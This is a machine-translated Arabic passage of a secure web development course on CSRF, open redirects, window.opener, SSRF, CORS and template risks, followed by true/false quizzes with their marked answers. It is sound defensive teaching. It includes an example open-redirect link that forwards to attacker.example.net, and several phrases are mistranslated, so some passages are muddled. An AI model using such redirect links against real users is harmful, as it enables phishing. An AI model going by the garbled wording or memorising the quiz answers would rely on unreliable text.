نوع آخر من الهجوم الذي غالبا ما كانت مواقع الويب عرضة له يسمى تزوير الطلبات عبر المواقع (CSRF أو XSRF). إنها مشكلة أقل اليوم ، ولكن لا يزال من الممكن أن تحدث ، لذلك دعونا نتعلم ما هي وكيف يمكن مواجهتها. CSRF هو أيضا مثال رائع على كيف يمكن أن تصبح الثغرات الأمنية المحددة أقل شيوعا بمرور الوقت ؛ إذا استطعت ، حاول إيجاد طرق عامة للقضاء على أنواع أخرى من نقاط الضعف!

في هجوم CSRF ، يخدع المهاجم المستخدم لإرسال البيانات إلى ** الخادم ، حيث يفسر الخادم الطلب على أنه طلب من المستخدم ويعمل عليه مباشرة. على سبيل المثال، يمكن للمهاجم إنشاء نموذج باستخدام زر إرسال على موقع الويب الخاص بالمهاجم، ولكن يطلب من مستعرض الويب الخاص بالمستخدم إرسال النموذج المكتمل إلى خادم يعمل على هذا النموذج. لاحظ أنه إذا قام المستخدم بتسجيل الدخول إلى هذا الخادم (على سبيل المثال لأحد البنوك) ، فسيرى الخادم أن المستخدم قد قام بالفعل بتسجيل الدخول إلى البنك ، وقد يقتنع بفعل شيء لم يكن المستخدم ينوي القيام به (مثل تحويل الكثير من المال إلى المهاجم).

في بعض النواحي ، يكون هجوم CSRF عكس هجوم XSS. يستغل XSS ثقة المستخدم في الخادم ؛ يستغل CSRF ثقة الخادم في العميل (أن المستخدم يقدم طلبا معينا عن قصد). بعبارة أخرى: XSS يخدع العملاء. CSRF يخدع الخوادم.

يتمثل الإجراء المضاد الشائع المستخدم اليوم في معظم أطر تطبيقات الويب المستخدمة على نطاق واسع في إرسال رمز CSRF سري خاص بالمستخدم بجميع الأشكال وأي عناوين URL أخرى ذات آثار جانبية ، ثم التحقق للتأكد من تضمين السر الصحيح مع أي طلب له آثار جانبية. نظرا لأن المهاجمين لن يعرفوا القيمة السرية ، لا يمكن للمهاجم إدخال رمز CSRF مطابق. نظرا لأن هذا مدمج في جميع أطر عمل الويب المستخدمة على نطاق واسع تقريبا اليوم ، فإن العديد من التطبيقات محمية تلقائيا من CSRF (ما لم تقم بتعطيل الحماية أو عدم استخدام إطار العمل بشكل صحيح). يجب أن تفضل إطار تطبيق ويب يحتوي على آلية رمز CSRF.

إجراء مضاد شائع آخر يستخدم اليوم هو ما يسمى  ملفات تعريف الارتباط **SameSite**. تاريخيا ، تم إرسال جميع ملفات تعريف الارتباط إلى خادم كلما كان لدى المستخدم ملفات تعريف ارتباط مطابقة لهذا الخادم ، حتى عندما كانت الصفحة الأساسية التي يتم عرضها من خادم مختلف. على سبيل المثال ، قد تتضمن صفحة ويب في الموقع BB إشارة إلى صورة في الموقع CC ؛ عندما يقوم متصفح الويب بتنزيل الصورة من CC ، فإنه سيرسل جميع ملفات تعريف الارتباط ذات الصلة. ومع ذلك ، هذا لا معنى له حقا. في كثير من الحالات ، لا ينبغي إرسال ملفات تعريف الارتباط إذا كان التفاعل ناتجا عن خادم غير ذي صلة. لذلك تحتوي المتصفحات الحديثة  على إعداد **SameSite اختياري ** على ملفات تعريف الارتباط. إذا كان الإعداد **متساهلا** أو **صارما** ، فلن يتسبب الطلب الذي يسببه مهاجم على خادم مختلف في إرسال ملف تعريف الارتباط (مثل الجلسة). طالما أن ملفات تعريف ارتباط الجلسة الخاصة بك تحتوي على  إعداد **SameSite** من **Lax** أو **Strict** ، فإن هجمات CSRF لا تعمل بشكل عام. والأفضل من ذلك ، تعمل المتصفحات الحديثة على جعل **SameSite = Lax** هو الإعداد الافتراضي. من الأفضل تعيين **SameSite** على **Lax** أو **Strict** بنفسك ، ولكن الإعداد الافتراضي الآمن لا يزال أمرا جيدا.

باختصار ، أصبحت نقاط الضعف في CSRF أقل شيوعا لأن الصناعة تتجه نحو التخلف عن السداد الآمن. يوضح هذا أنه  من *الممكن* تقليل احتمالية وجود فئات كاملة من الثغرات الأمنية من خلال تصميم أو تعديل الأنظمة بحيث يكون الإعداد الافتراضي آمنا. حيثما أمكن ، قم ببناء إجراءات مضادة في أدواتك / معاييرك / نظامك حتى لا تحدث المشكلة. إذا كنت تقوم بإنشاء تطبيق ويب جديد ، فمن غير المرجح أن يكون هناك مشكلة ، ولكن تأكد من أن إطار عمل الويب الخاص بك يتصدى له وأنك تستخدم آلياته بشكل صحيح.

 على الرغم من أنه أصبح أقل شيوعا ، إلا أن تزوير الطلبات عبر المواقع (CSRF) لا يزال سببا شائعا بدرجة كافية للثغرات الأمنية لدرجة أنه 2019 CWE Top 25 # 9. تم تحديده أيضا باسم [CWE-352](https://cwe.mitre.org/data/definitions/352.html). اعتاد أن يكون في أعلى 10 OWASP. إنه ليس في إصدار 2017 ، لأن العديد من الأطر الحديثة تمنعه الآن ، لكنه لا يزال مهما إذا كان برنامجك عرضة له.

بالطبع ، هناك طرق أخرى قد يتمكن المهاجم من خلالها من التحكم المؤقت في نظام المستخدم. لذلك قد لا تزال ترغب في تنفيذ بعض الإجراءات المضادة التقليدية الأخرى ل CSRF ، مثل:

1. تسجيل خروج المستخدمين تلقائيا بعد فترة من الوقت ، أو بعض الوقت من عدم النشاط.

2. إذا كان الإجراء خطيرا بشكل خاص (على سبيل المثال ، حذف الحساب أو نقل مبلغ كبير من المال) ، فطلب تأكيدا إضافيا منفصلا مصادقا عليه بأن المستخدم يطلبه بالفعل. هذا أمر جيد على أي حال ، لأن هناك العديد من الطرق التي قد يتمكن بها المهاجم من التحكم مؤقتا في الحساب ؛ الحد من التأثير هو جزء من إدارة المخاطر.

#### اختبار 4.6: CSRF / XSRF

أصبحت ثغرات >\>CSRF أقل شيوعا اليوم لأن أطر تطبيقات الويب ومتصفحات الويب لديها عموما تدابير مضادة لتقليل احتمالية حدوث هذه الثغرات الأمنية. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

[تفسير]

هذا صحيح! هذا يدل على أنه في بعض الأحيان يكون ** من  الممكن تعديل الأنظمة لتقليل احتمالية حدوث فئات كاملة من الهجمات. يجب عليك أيضا البحث باستمرار عن طرق للقضاء على فئات كاملة من الهجمات ، إما في تطبيقك المحدد أو العالم بشكل عام.

[تفسير]

### فتح عمليات إعادة التوجيه وإعادة التوجيه

[تطبيق ويب]

يجب ألا يقبل تطبيق الويب الإدخال الذي يتحكم فيه المستخدم والذي يحدد رابطا إلى بعض المواقع على خادم مختلف ، ثم ، بدون ضوابط صارمة ، استخدم هذا الرابط لإجراء إعادة توجيه. يحتوي تطبيق الويب الذي يقوم بذلك على *إعادة توجيه مفتوحة*.

قد يكون من الصعب فهم ذلك ، لذلك دعونا نلقي نظرة على مثال. دعنا نتخيل أن تطبيق الويب من جانب الخادم يحتوي على رابط "**/ redirect**" يقبل معلمة  url = **، ثم يعيد توجيه الطلبات ببساطة إلى **قيمة url =.**** هذا يعني أنه يمكن للمهاجم إنشاء ملف HTML في أي مكان يشبه هذا (يعتمد المثال على نص في نص MITRE على [CWE-601](https://cwe.mitre.org/data/definitions/601.html)):

<b><a href="https&#58;//bank.example.com/redirect?url=https&#58;//attacker.example.net"> انقر هنا لتسجيل الدخول</a></b>

ما هي المشكلة؟ تكمن المشكلة في أن المستخدم الذي تحقق من الرابط سيعتقد أن هذا الرابط انتقل إلى مجال موثوق به (على سبيل المثال ، **bank.example.com**). في حين أن هذا صحيح من الناحية الفنية ، عند النقر عليه ، فإن النطاق المفترض أنه موثوق به سيعيد توجيه المستخدم بهدوء إلى نطاق آخر قد يكون خطيرا وليس ما توقعه المستخدم (على سبيل المثال ، **attacker.example.net**). بشكل عام ، تكمن المشكلة في أنه يمكن استخدام إعادة التوجيه المفتوحة لخداع البشر وإنشاء هجمات تصيد أقوى. يمكن أن يهدأ البشر إلى التفكير في أنهم ذاهبون إلى مجال موثوق به ، دون أن يدركوا أنه سيتم نقلهم على الفور إلى مجال غير موثوق به. من الناحية النظرية ، يجب على المستخدمين أيضا التحقق  من *مكان وجودهم الآن في * كل صفحة ، لكن البشر المشغولين لا يفعلون ذلك في كثير من الأحيان. نريد أن نجعل الأمر أكثر صعوبة ، وليس أسهل ، لخداع البشر المشغولين.

المشكلة ذات الصلة هي "إعادة توجيه" ، حيث يقوم تطبيق الويب بإعادة توجيه الطلب إلى جزء آخر من تطبيق الويب. قد يعرض تطبيق الويب الطلب بشكل غير صحيح كطلب *داخلي* من  تطبيق الويب نفسه ، بدلا من أن يأتي بشكل أكثر دقة من مستخدم خارجي ، ويمنحه امتيازات غير مبررة.

  تناقش [ورقة الغش OWASP حول عمليات إعادة التوجيه وإعادة التوجيه غير المؤكدة](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) مختلف التدابير المضادة الممكنة:

* *"ببساطة تجنب استخدام عمليات إعادة التوجيه وإعادة التوجيه.*

* *إذا تم استخدامه ، فلا تسمح بعنوان URL كإدخال مستخدم للوجهة.*

* *حيثما أمكن ، اطلب من المستخدم تقديم [a] اسم مختصر أو معرف أو رمز مميز يتم تعيينه من جانب الخادم إلى عنوان URL مستهدف كامل.*

  * *يوفر هذا أعلى درجة من الحماية ضد الهجوم العبث بعنوان URL.*

  * *كن حذرا من أن هذا لا يقدم ثغرة أمنية في التعداد حيث يمكن للمستخدم التنقل عبر المعرفات للعثور على جميع أهداف إعادة التوجيه المحتملة*

* *إذا تعذر تجنب إدخال المستخدم، فتأكد من أن القيمة المتوفرة صالحة ومناسبة للتطبيق ومصرح بها للمستخدم.*

* *قم بتعقيم الإدخال عن طريق إنشاء قائمة بعناوين URL الموثوق بها (قوائم المضيفين أو regex).*

  * *يجب أن يستند هذا إلى نهج القائمة المسموح بها ، بدلا من الرفض ".*

 تعد عمليات إعادة التوجيه المفتوحة سببا شائعا للثغرات الأمنية لدرجة أن هذا الضعف هو 2021 CWE Top 25 # 37 و 2019 CWE Top 25 # 32. إنه [CWE-601](https://cwe.mitre.org/data/definitions/601.html).

#### اختبار 4.7: فتح عمليات إعادة التوجيه وإعادة التوجيه

\>\>لا بأس من دعم عنوان URL لمعيد التوجيه ، على سبيل المثال ، **<https://bank.example.com/redirect?url=https://dangerous.example.com>**طالما تم تعقيم عنوان URL بعناية للسماح فقط بعناوين URL الموثوق بها. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

[تفسير]

هذا صحيح! المشكلة ليست إعادة التوجيه ، إنها إعادة  توجيه *غير مصادق عليها*. بالطبع ، إذا كنت لا تسمح بإعادة التوجيه على الإطلاق ، فهذا أكثر أمانا ، ولكن على الأقل من المهم التحقق من صحة إعادة التوجيه للتأكد من أنها قيمة تتوقعها.

[تفسير]

### هدف **HTML ** وجافا سكريبت **window.open()**

[تطبيق ويب]

هناك مشكلة غريبة في سمة هدف HTML **** لا يعرفها الكثير من الناس. دعونا نشرح المشكلة ، وبعض الحلول الجزئية.

في HTML ، **&lt ؛ a href = ... >** ينشئ ارتباطا تشعبيا. بناء HTML**<a href=... الهدف = ... ينشئ >** ارتباطا تشعبيا حيث ، إذا نقرت عليه ، فإنه ينشئ "هدفا" جديدا. القيمة الافتراضية للهدف  هي&#95;self; **إذا قمت بتعيين  الهدف**، فإن القيمة الشائعة هي **target="&#95;blank"** التي تنشئ الهدف في علامة تبويب جديدة.****

ولكن ما لا يدركه الكثيرون هو أن قيمة "**الهدف**" بخلاف القيمة الافتراضية "**&# 95; self**" قد تخلق ، في بعض الحالات ، ثغرة أمنية. نظرا للطريقة التي تعمل بها ، يتم تشغيل الصفحة التي يتم ربطها بنفس ** عملية صفحة الاتصال. نتيجة لذلك ، بنقرة واحدة ، تكتسب صفحة الاستلام تحكما جزئيا في صفحة الارتباط ، *حتى لو كانت من أصول مختلفة*. الطريقة الأساسية التي يحدث بها ذلك هي من خلال ** قيمة window.opener.** يمكن لصفحة الاستلام القيام بأشياء مثل إجبار  صفحة *الاتصال* على  الانتقال إلى صفحة مختلفة (على سبيل المثال ** ، window.opener.location.href = newURL**) ، وتوفير صفحة جديدة تشبه الصفحة القديمة (على الرغم من أنها في مكان مختلف) ، وخداع المستخدم للقيام بشيء ما على الصفحة "نفسها" التي ليست هي نفسها على الإطلاق. هناك مشكلة ذات صلة وهي أن الصفحة الجديدة قد تحصل أيضا على معلومات "المحيل" التي ربما لم تكن تتوقعها.

يمكن أن يحدث نفس النوع من المشاكل في جافا سكريبت. يحتوي "**window.open**" الخاص بجافا سكريبت على هدف افتراضي هو** "&#95;blank**"; نظرا لأن هذا ليس "**&# 95 ؛ self**" ، فإن *القيمة الافتراضية* ل **window.open ()** غير آمنة. مرة أخرى ، سيفتح نافذة تقوم بتحميل صفحة أخرى يتم منحها التحكم في نفس الوقت في صفحة الاتصال الخاصة بها ، *حتى لو كانت* لها أصول مختلفة.

بالطبع ، إذا كنت تستطيع الوثوق بهذه الصفحة الأخرى ، فهذه ليست مشكلة أمنية. لذا فإن استخدام قيمة مستهدفة لا يمثل مشكلة في كثير من الأحيان طالما أنك تشير إلى  موقعك *الخاص*. ولكن إذا كنت تشير إلى موقع آخر ، فقد يكون هذا مصدر قلق أكبر - هل أنت متأكد من أنه يمكنك الوثوق به؟ حتى إذا كنت تثق في موقعك أو موقع آخر ، فقد يكون من غير الحكمة السماح بذلك - ماذا يحدث إذا اقتحم شخص ما هذا الجزء أو ذلك الموقع الآخر؟ مرة أخرى ، هناك مبدأ الامتياز الأقل - لا نريد منح امتيازات إذا لم نكن بحاجة إلى ذلك. يمكن أن يكون هذا أيضا مشكلة بسيطة في الأداء ؛ قد يعاني أداء الصفحة بسبب استخدام عملية مشتركة.

أبسط حل هو تجنب استخدام **الهدف = ... ** في HTML ، وقم دائما بتعيين **target = "& # 95 ؛ self"** عند استدعاء JavaScript **window.open () ...**  خاصة بالنسبة للروابط إلى المحتوى الذي ينشئه المستخدم والمجالات الخارجية. إذا قررت استخدام **HTML target = **، فاستخدم أيضا **rel = "noopener noreferrer".**  يخبر "**noopener**" متصفح الويب *بعدم* السماح لجافا سكريبت بالتحكم في نافذة الإحالة (لذلك  لن يمنح **window.opener** حق الوصول إليها).  يمنع "**noreferrer**" تمرير معلومات المحيل إلى علامة التبويب / النافذة الجديدة ([*الثغرة الأمنية وتأثير أداء المتصفح على الهدف = "&# 95 ؛ فارغ"*](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547) بواسطة Darren Sim ، 2019).

#### اختبار 4.8: **هدف HTML ** وجافا سكريبت **window.open()**

\>\>في مرساة HTML (**<a href=... >**) إلى موقع آخر ، إذا كنت تستخدم **الهدف = ...**  باستخدام قيمة أخرى غير **&#95;self**، تأكد أيضا من تعيين "**rel" إلى "**noopener noreferrer**" لمنع التحكم بواسطة هذا الموقع الآخر من علامة التبويب الأصلية. صواب أم خطأ؟<<**

(x) صحيح

( ) خطأ

[تفسير]

هذا صحيح! نعم ، هذه نقطة غريبة ودقيقة. هناك سبب للأمل في أن تؤدي التطورات المستقبلية في HTML و JavaScript إلى إغلاق هذه الثغرة الأمنية غير المتوقعة ، ولكن في الوقت الحالي ، من المهم معرفة ذلك.

[تفسير]

### استخدام عناوين URL التي تم التحقق منها بشكل غير كاف / تزوير الطلبات من جانب الخادم (SSRF)

محدد موقع الموارد الموحد (URL) هو طريقة للإشارة إلى مورد ويب معين حسب الموقع. من الناحية الفنية ، يعد عنوان URL نوعا محددا من معرف الموارد الموحد (URI) ، ولكن لأغراضنا سنستخدم المصطلحات بالتبادل. كما هو محدد في [IETF RFC 3986 ](https://tools.ietf.org/html/rfc3986)، يحتوي URI العام على بناء الجملة هذا:

**مخطط:[سلطة]مسار[؟استفسار]&#8202;[&#35;جزء]**

والسلطة **** لديها هذا النحو:

**[معلومات المستخدم @]مضيف[:ميناء]**

في بعض الأحيان ، يمنحك المستخدمون غير الموثوق بهم البيانات التي تريد استخدامها كعنوان URL (أو تحويلها إلى عنوان URL) لطلب مزيد من المعلومات. ومع ذلك ، يمكن أن يكون هذا خطيرا. إذا قمت بتضمين عنوان URL في البيانات التي تقدمها إلى مستخدم ، فقد يفعل ما يعادل النقر عليه. اتضح أن عناوين URL هي أشياء قوية ، وقد يحاول المهاجم استغلال أي من قدراته. على سبيل المثال:

* لا يحتاج عنوان URL إلى استخدام **مخطط https**:  ؛ قد يحتوي على مخططات أخرى  مثل **file**:  (لاسترداد ملف محلي) أو حتى مخططات غامضة نسبيا مثل **gopher:**.  أحد الهجمات المتستر هو طلب مخطط واحد (مثل "**gopher:**") لخدمة تتوقع بروتوكولا مختلفا تماما ؛ قد يتمكن المهاجم من استخدام هذا الارتباك لإنتاج هجوم.

* قد لا يكون "المضيف" هو ما تتوقعه ؛ قد يشير المضيف إلى كمبيوتر آخر تعسفي أو حتى الكمبيوتر الطالب.

* قد يوفر المهاجم **معلومات** المستخدم  (اسم حساب المستخدم) و/أو منفذا. يسمح المنفذ ، على سبيل المثال ، لعنوان URL بطلب اتصال على *أي* منفذ لجهاز كمبيوتر.

* يمكن لعنوان URL ترميز مجموعة متنوعة من الأحرف لأي من هذه البيانات.

إذا تم خداع الخادم لطلب عنوان URL تم التحقق منه بشكل غير كاف ، فإنه يطلق عليه *تزوير الطلب من جانب الخادم* (SSRF).

الحل الرئيسي هو التأكد من أنك تحد بشكل كبير من كيفية إنشاء أي عناوين URL تطلبها. إن أمكن، لا تستخدم بيانات غير موثوق بها لإنشاء عناوين URL هذه. إذا كان يجب عليك استخدام بيانات غير موثوق بها لإنشاء عنوان URL (وهذا يحدث غالبا) ، فقم بالحد الأقصى من عناوين URL التي يمكن إنشاؤها وتأكد من إمكانية ** إنشاء عناوين URL الآمنة فقط. على سبيل المثال ، في كثير من الحالات اليوم ، يمكنك قصر عنوان URL على مخطط واحد** (https:) **، وعادة لا تكون هناك حاجة للسماح (على سبيل المثال) بالمنافذ أو أسماء المستخدمين.

 يعد تزوير الطلبات من جانب الخادم (SSRF) سببا شائعا للثغرات الأمنية لدرجة أنه 2021 OWASP Top 10 # 10 ، و 2021 CWE Top 25 # 24 ، و 2019 CWE Top 25 # 30. إنه [CWE-918](https://cwe.mitre.org/data/definitions/918.html).

#### اختبار 4.9: استخدام عناوين URL التي تم التحقق منها بشكل غير كاف / تزوير الطلبات من جانب الخادم (SSRF)

\>\>URL هي مجرد طرق لتحديد موقع المعلومات ، لذا فإن التحقق من صحتها ليس مهما. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

عفوًا! إن أمكن، لا تستخدم بيانات غير موثوق بها لإنشاء عناوين URL هذه. إذا كان يجب عليك (ويجب عليك في كثير من الأحيان) ، فقم بالحد الأقصى من عناوين URL التي يمكن إنشاؤها وتأكد من إمكانية * إنشاء عناوين URL* الآمنة فقط.

[تفسير]

### سياسة المنشأ نفسه وتقاسم الموارد عبر المنشأ (CORS)

[تطبيق الويب]

عندما يحصل متصفح الويب على ملف HTML ، يسمح لملف HTML بالرجوع بحرية إلى الصور ومقاطع الفيديو وأوراق أنماط CSS والبرامج النصية للتشغيل. عادة ما يحاول متصفح الويب استردادها واستخدامها ، بغض النظر عن موقع الويب الذي تأتي منه هذه المواد.

ومع ذلك ، عندما يقوم متصفح الويب باسترداد برنامج نصي وتشغيله (مثل JavaScript) ، سيكون من الخطر على متصفح الويب السماح لهذا البرنامج النصي بالتفاعل بسهولة مع مواقع الويب التعسفية. إذا تم السماح بذلك ، يمكن للبرنامج النصي الضار إرسال بيانات خاصة خلسة إلى أي موقع آخر ، ويمكن أن يهاجم البرنامج النصي أيضا مواقع الويب الأخرى (على سبيل المثال ، عن طريق استغلال نقاط الضعف أو شن هجوم DDoS).

لمنع العديد من مشاكل الأمان ، تفرض متصفحات الويب عادة على برامج JavaScript من جانب العميل مجموعة من القواعد تسمى *سياسة نفس الأصل*. بموجب سياسة نفس الأصل ، يسمح لبرامج JavaScript من جانب العميل فقط بالتفاعل مع نفس الأصل ، **بما في ذلك عرض أي موارد. أصل عنوان URL هو مزيج من البروتوكول (عادة https) والمنفذ (443 افتراضيا ل https) والمضيف. وبالتالي **<https://example.com/foo>** **<https://example.com/bar>** ،  وتعتبر لها نفس الأصل لأن لديها مجموعة (https ، 443 ، example.com). الغرض من سياسة المصدر نفسه هو عزل المستندات التي يحتمل أن تكون ضارة (Mozilla ، سياسة [*المنشأ نفسه*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)).

تمنع سياسة نفس الأصل العديد من مشكلات الأمان ، ولكنها في بعض الأحيان صارمة للغاية. يمكن أن يسمح موقع الويب على وجه التحديد بالتفاعل بواسطة JavaScript من أصول أخرى باستخدام مشاركة الموارد عبر الأصل (CORS). يمكن أن يكون CORS مفيدا ، لأنه يخفف من قيود سياسة نفس المنشأ. يمكن أن يكون CORS مشكلة أيضا ، نظرا لأن CORS يمكن أن يتيح نقاط الضعف إذا تم استخدامه بشكل سيئ. يتم تحديد CORS بتفصيل كبير في [مواصفات WHATWG Fetch](https://fetch.spec.whatwg.org/#http-extensions). موزيلا لديها وصف لطيف ل CORS في وثائقها[](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). في هذه الوحدة ، سنغطي بإيجاز النقاط البارزة ، ونلخص بعض المواد من وثائق Mozilla CORS.

باختصار: يسمح CORS لخوادم الويب بالإعلان عن الأصول الأخرى المسموح لها بالوصول إلى الموارد (عناوين URL) ، وأفعال HTTP (**GET ، **POST**  ، **DELETE** ، **إلخ) المسموح بها لتلك الأصول الأخرى. تطلب متصفحات الويب هذه المعلومات وتستخدمها لتحديد ما إذا كان يسمح لبرامج JavaScript من جانب العميل بتقديم طلب عبر الأصل (أي إجراء خارج أصلها). يتم تبادل هذه المعلومات باستخدام رؤوس HTTP جديدة يتم إخراجها بواسطة متصفح الويب وخادم الويب. تستخدم طلبات CORS لطلبات **XMLHttpRequest** و **Fetch** عبر الأصل (من بين ظروف أخرى).

هناك نوعان من طلبات CORS ، طلب بسيط (ما يسمى) ** وطلب *تم اختباره مسبقا*. هذا هو التحسين. تستخدم الطلبات البسيطة تفاعلا واحدا، بينما تستخدم الطلبات الناجحة التي تم اختبارها مسبقا تفاعلين. يتم تنفيذ أي طلب CORS لا يمكن تنفيذه بطلب بسيط تلقائيا بواسطة متصفح الويب مع طلب تم اختباره مسبقا. تتمتع الطلبات التي تم اختبارها مسبقا بزمن انتقال أكبر من الطلب البسيط ، لذلك حيثما *أمكن* ، اكتب التعليمات البرمجية من جانب العميل بحيث تستخدم طلبات CORS البسيطة. في بعض الأحيان لا يكون ذلك ممكنا ، وبعد ذلك سيتم تلقائيا استخدام طلب محدد مسبقا بزمن انتقال أعلى.

يتم استخدام طلب CORS بسيط عندما  يكون *كل* ما يلي صحيحا:

* الطريقة المطلوبة هي **GET**  أو **HEAD** أو **POST**

* رؤوس الطلبات هي فقط تلك التي يتم تعيينها تلقائيا بواسطة متصفح الويب (المعروف أيضا باسم وكيل المستخدم) ، والتي يتم توسيعها اختياريا باستخدام رؤوس الطلبات *المدرجة في CORS*. ومن أمثلة هذه الرؤوس المدرجة في القائمة الآمنة قبول ****وقبول **اللغة **ولغة المحتوى** وعرض منفذ العرض** ****والعرض**.** 

* رأس  **نوع المحتوى** هو واحد من: **التطبيق / x-www-form-urlencoded **أو **متعدد الأجزاء / form-data** أو **النص / عادي**.

* يتم استيفاء بعض المتطلبات الأخرى أيضا. انظر المواصفات للحصول على التفاصيل ؛ في معظم الحالات ، سيتم استيفاء هذه المتطلبات الأخرى.

عند تقديم طلب CORS بسيط ، يقوم متصفح الويب بإجراء الطلب كالمعتاد ويقوم أيضا بتعيين أصل رأس HTTP **** إلى أصل البرنامج النصي. ثم يحدد خادم الويب ما إذا كان هذا الطلب مقبولا أم لا. ثم يقوم خادم الويب بالرد وتعيين رأس HTTP **Access-Control-Allow-Origin** مع معلومات حول الأصل (الأصول) المسموح بها. إذا كانت هذه القيمة هي "**&#42;** "، ثم ** يسمح لأي أصل بهذا الوصول. ينظر متصفح الويب إلى **Access-Control-Allow-Origin** ، وإذا تطابق الأصل الطالب ، يتلقى البرنامج النصي أي معلومات يتم إرجاعها.

يستخدم الطلب المبدئي ، على عكس الطلب البسيط ، خطوة إضافية. في طلب تم اختباره مسبقا ، يرسل متصفح الويب أولا طلب **OPTIONS** مع **الأصل** ومعلومات أخرى ، لسؤال خادم الويب عما إذا كان الطلب الفعلي "*آمنا للإرسال*". إذا وافق خادم الويب على ذلك ، إرسال الطلب الفعلي. لا تتبع بعض المتصفحات عمليات إعادة التوجيه لطلب تم اختباره مسبقا. راجع [وثائق Mozilla CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) للحصول على حلول إذا كان الأمر يهمك.

بشكل افتراضي ، لن ترسل المتصفحات بيانات الاعتماد (ملفات تعريف الارتباط ومعلومات مصادقة HTTP) في طلب CORS. ومع ذلك، يمكن تعيين علامة معينة على  كائن **XMLHttpRequest** أو **منشئ طلب** لإرسال بيانات الاعتماد. إذا تم ذلك ، يجب أن يقوم خادم الويب بإرجاع **Access-Control-Allow-Credentials: true** أو لن يتلقى برنامج JavaScript النتائج. يجب أن تكون خوادم الويب حذرة للغاية بشأن استخدام هذا ؛ إذا تم استخدامه على الإطلاق ، فكن صعب الإرضاء بشأن الأصول المسموح بها. يعد *عدم* استخدام **Access-Control-Allow-Credentials** أكثر أمانا ، حيث يسمح ذلك بالتحكم البرمجي المعتمد من أصل مختلف.

إذا كنت تنوي أن تكون بعض المعلومات قابلة للقراءة بشكل عام على خادم الويب الخاص بك ، ولا تختلف أبدا (بغض النظر عمن طلبها أو من أين هي) ، ففكر في إرجاع "**Access-Control-Allow-Origin: &#42;** " عندما يحاول متصفح الويب **الحصول على** هذه المعلومات. يسمح ذلك لبرامج JavaScript من جانب العميل باسترداد تلك المعلومات مباشرة واستخدامها بشكل أكبر. هذا يسمح لبرامج JavaScript بطلب ذلك بشكل متكرر ، لذلك من الناحية النظرية يجعل هجمات DDoS أسهل قليلا. ومع ذلك ، بالنسبة للعديد من مواقع الويب ، فإن الهدف هو توزيع بعض المعلومات ، ويمكن مواجهة DDoS بطرق أخرى.

في بعض الأحيان قد تختلف المعلومات اعتمادا على أصل مقدم الطلب (هذا صحيح إذا قمت بتعيين **Access-Control-Allow-Origin** على أي قيمة أخرى غير "**&#42;** "). في هذه الحالات ، تأكد من تضمين رأس "**مختلف**" مع القيمة "**الأصل**". ****تخبر هذه القيمة "المختلفة" متصفح الويب أن النتيجة قد تختلف اعتمادا على الأصل ، مما يمنع المعلومات من أصل واحد من التسرب إلى أصل آخر (أو عدم وجود أصل) عبر CORS.

تتوفر تفاصيل حول كيفية تمكين CORS لمجموعة كبيرة ومتنوعة من الظروف على [enable-cors.org](https://enable-cors.org/). يمكنك أيضا التحقق من الموارد التالية لمزيد من التفاصيل:

* [مجموعة عمل تكنولوجيا تطبيق النص التشعبي على الويب (WHATWG).](https://fetch.spec.whatwg.org/)[* جلب*](https://fetch.spec.whatwg.org/)

* [وثائق سياسة ](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[*موزيلا*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[من نفس الأصل](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

* [وثائق موزيلا لمشاركة الموارد عبر المنشأ (CORS).](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

### تنسيق السلاسل والقوالب

يمكن أن يكون تحقيق النتائج معقدا. تحتوي جميع لغات البرمجة تقريبا على آليات خاصة لتسهيل الإخراج ؛ حتى الإصدار الأصلي لعام 1956 من FORTRAN فعل ([*نظام الترميز التلقائي FORTRAN ل IBM 704 EDPM: الدليل المرجعي للمبرمج*](https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf) ، 1956)! تتضمن هذه الآليات أنواعا مختلفة من أنظمة سلسلة التنسيق والقوالب. يمكن أن تكون هذه الآليات قوية جدا وتسريع التنمية. كما يمكن أن تكون حاسمة في مواجهة نقاط الضعف. واحدة من أفضل الطرق لمواجهة هجمات البرمجة النصية عبر المواقع (XSS) هي استخدام نظام القوالب الذي يتصدى لها افتراضيا ، كما ناقشنا بالفعل.

ومع ذلك ، *كن حذرا جدا* بشأن السماح للمستخدمين غير الموثوق بهم  بالتحكم في تنسيقات الإخراج (أي استخدام سلاسل التنسيق والقوالب من المستخدمين غير الموثوق بهم). في كثير من الحالات ، يجب *ألا* تسمح للمستخدمين غير الموثوق بهم بتعيين تنسيقات الإخراج التي تستخدمها أنظمة القوالب للأغراض العامة دون التحقق من صحتها بعناية أولا. يمكن لبعض أنظمة تنسيق الإخراج تنفيذ تعليمات برمجية عشوائية ، أو الكشف عن معلومات تتجاوز مجموعة محددة من القيم المعتمدة - ويجب *عليك بالتأكيد* عدم السماح بذلك في معظم الحالات! حتى عندما لا يمكنهم تشغيل ** تعليمات برمجية عشوائية ، فإنهم بحكم تعريفهم يتحكمون في الإخراج ، وقد يكونون قادرين على إنشاء نتائج مضللة أو نتائج تطغى أينما ذهب الناتج.

